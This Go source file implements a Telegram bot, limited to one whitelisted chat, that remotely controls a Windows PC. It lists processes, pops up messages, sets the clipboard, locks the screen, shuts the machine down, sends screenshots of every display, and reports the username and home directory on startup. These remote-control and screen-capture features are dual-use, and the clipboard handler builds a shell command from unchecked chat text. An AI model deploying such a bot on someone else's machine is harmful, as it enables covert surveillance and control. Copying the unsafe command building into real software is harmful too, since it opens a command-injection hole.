package telegram

import (
	"bytes"
	"fmt"
	"image/png"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/mitchellh/go-ps"
	"github.com/ranjbar-dev/gowin/config"
	tele "gopkg.in/telebot.v4"
	"gopkg.in/telebot.v4/middleware"
)

var (
	user32              = syscall.MustLoadDLL("user32.dll")
	procLockWorkStation = user32.MustFindProc("LockWorkStation")

	// Universal markup builders.
	menu = &tele.ReplyMarkup{ResizeKeyboard: true}

	// Reply buttons.
	btnHelp          = menu.Text("/help")
	btnTime          = menu.Text("/time")
	btnListProcesses = menu.Text("/processes")
	btnMessage       = menu.Text("/message")
	btnCopyText      = menu.Text("/copy")
	btnLock          = menu.Text("/lock")
	btnShutdown      = menu.Text("/shutdown")
	btnScreenShot    = menu.Text("/screenshot")
)

func (t *Telegram) RegisterHandlers() {

	adminOnly := t.bot.Group()
	adminOnly.Use(middleware.Whitelist(config.TelegramChatID()))

	adminOnly.Handle("/start", func(c tele.Context) error {

		user := c.Sender()

		return c.Send("hello "+user.FirstName+" "+user.LastName, menu)
	})

	adminOnly.Handle(&btnHelp, func(c tele.Context) error {

		text := "you can use the following commands:\n"
		text += "/help - show this help\n"
		text += "/time - show the system time\n"
		text += "/processes - list all processes\n"
		text += "/message - open a new message box and put the text in it\n"
		text += "/copy - copy text to clipboard\n"
		text += "/lock - lock the screen\n"
		text += "/shutdown - shutdown the system\n"
		text += "/screenshot - take a screenshot of the screens\n"

		return c.Send(text)
	})

	adminOnly.Handle(&btnTime, func(c tele.Context) error {

		return c.Send(fmt.Sprintf("Current time is %s", time.Now().Format("15:04:05")))
	})

	adminOnly.Handle(&btnListProcesses, func(c tele.Context) error {

		processes, err := ps.Processes()
		if err != nil {

			return c.Send(fmt.Sprintf("Error in getting processes: %v", err))
		}

		localMap := make(map[string]struct{})
		for _, process := range processes {

			localMap[process.Executable()] = struct{}{}
		}

		var list string
		var i int
		for process := range localMap {

			i++
			list += fmt.Sprintf("%d: %s\n", i+1, process)
		}

		return c.Send(list)
	})

	adminOnly.Handle(&btnMessage, func(c tele.Context) error {

		args := c.Args()
		if len(args) == 0 {

			return c.Send("you must provide text after command")
		}

		text := strings.Join(args, " ")

		// Create a command to show the popup without blocking the handler
		go func() {
			// Create a command to show a message box
			cmd := exec.Command("cmd", "/c", "msg", "*", text)
			err := cmd.Run()
			if err != nil {

				// If there's an error, we can't report it back to the user since we're in a goroutine
				fmt.Println("Error showing message box:", err)
			}
		}()

		return c.Send("popped up the message box, xP")
	})

	adminOnly.Handle(&btnCopyText, func(c tele.Context) error {

		args := c.Args()
		if len(args) == 0 {

			return c.Send("you must provide text after command")
		}

		text := strings.Join(args, " ")

		// Copy text to clipboard
		cmd := exec.Command("cmd", "/c", fmt.Sprintf("echo %s", text), "|", "clip")
		err := cmd.Run()
		if err != nil {

			return c.Send(fmt.Sprintf("Error copying text to clipboard: %v", err))
		}

		return c.Send("text copied to clipboard")
	})

	adminOnly.Handle(&btnLock, func(c tele.Context) error {

		cmd := exec.Command("rundll32.exe", "user32.dll,LockWorkStation")
		err := cmd.Run()
		if err != nil {

			return c.Send(fmt.Sprintf("Error locking the system: %v", err))
		}

		return c.Send("locked the system LOL")
	})

	adminOnly.Handle(&btnShutdown, func(c tele.Context) error {

		cmd := exec.Command("shutdown", "/s", "/t", "0")
		err := cmd.Run()
		if err != nil {

			return c.Send(fmt.Sprintf("Error in shutting down the system: %v", err))
		}

		return c.Send("shutting down the system, bye")
	})

	adminOnly.Handle(&btnScreenShot, func(c tele.Context) error {

		n := screenshot.NumActiveDisplays()
		if n == 0 {
			return c.Send("No active displays found")
		}

		c.Send("Processing ...")

		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)

			// Try to capture with a small delay to ensure the system is ready
			time.Sleep(100 * time.Millisecond)

			img, err := screenshot.CaptureRect(bounds)
			if err != nil {

				// If BitBlt fails, try an alternative method
				if err.Error() == "BitBlt failed" {

					// Try capturing the entire screen instead of specific bounds
					img, err = screenshot.CaptureDisplay(i)
					if err != nil {

						return c.Send(fmt.Sprintf("Failed to capture screenshot (both methods): %v", err))
					}
				} else {

					return c.Send(fmt.Sprintf("Failed to capture screenshot: %v", err))
				}
			}

			var buf bytes.Buffer
			if err := png.Encode(&buf, img); err != nil {

				return c.Send(fmt.Sprintf("Failed to encode screenshot: %v", err))
			}

			photo := &tele.Photo{File: tele.FromReader(&buf)}
			if err := c.Send(photo); err != nil {

				return c.Send(fmt.Sprintf("Failed to send photo: %v", err))
			}
		}

		c.Send("Done")
		return nil
	})

}

func (t *Telegram) SendApplicationStartedMessage() error {

	// Get current user
	currentUser, err := user.Current()
	if err != nil {
		return fmt.Errorf("Error getting user info: %v", err)
	}

	// Get Windows version
	version := runtime.GOOS + " " + runtime.GOARCH
	if runtime.GOOS == "windows" {

		// Get more detailed Windows version info
		cmd := exec.Command("cmd", "/c", "ver")
		output, err := cmd.Output()
		if err == nil {

			version = string(bytes.TrimSpace(output))
		}
	}

	info := fmt.Sprintf("System Information:\n"+
		"Username: %s\n"+
		"Windows Version: %s\n"+
		"User Home: %s",
		currentUser.Username,
		version,
		currentUser.HomeDir)

	_, err = t.bot.Send(tele.ChatID(config.TelegramChatID()), info)
	return err
}

func (t *Telegram) SendApplicationStoppedMessage() error {

	_, err := t.bot.Send(tele.ChatID(config.TelegramChatID()), "Application stopped")

	return err
}

// btnScreenShot    = menu.Text("Take screenshot")
